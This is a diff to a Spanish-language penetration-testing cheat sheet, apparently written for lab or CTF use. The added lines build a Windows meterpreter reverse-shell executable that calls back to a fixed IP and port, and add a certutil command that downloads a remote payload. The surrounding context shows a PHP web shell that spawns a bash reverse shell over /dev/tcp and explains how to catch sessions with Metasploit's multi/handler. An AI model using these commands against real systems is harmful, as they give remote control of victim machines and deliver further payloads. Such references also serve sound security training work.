@@ -20,6 +20,8 @@ msfvenom -p [PAYLOAD] LHOST=[Nuestra IP] LPORT=[Puerto de escucha] -f raw > [arc
 
 msfvenom -p [PAYLOAD] -e [encoder (recomendado shikata_ga_nai)] -i [número de iteraciones que se aplica el encoder] LHOST=[IP Local] LPORT=[Puerto local] -f [formato del payload]
 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.32 LPORT=2222 -f exe > shell2.exe
+
 Tras subir payload a máquina víctima, ponemos Metasploit con "use multi/handler" y seleccionamos "set payload [el que hayamos usado]" y "set LHOST [nuestra IP]" y "set LPORT [el puerto elegido]" y seleccionamos "exploit"
 
 Para salir de un meterpreter sin cerrarlo, "background", y para listar sesiones activas "sessions -l"
@@ -113,6 +115,7 @@ SHELL PHP FUNCIONAL LINUX
 exec("/bin/bash -c 'bash -i >& /dev/tcp/IP-NUESTRA/PUERTO-NUESTRO 0>&1'");
  ?>
 
+Descargar archivos desde Windows
 certutil.exe -urlcache -split -f http://IP:PUERTO/shell.ps shell.ps
 
 
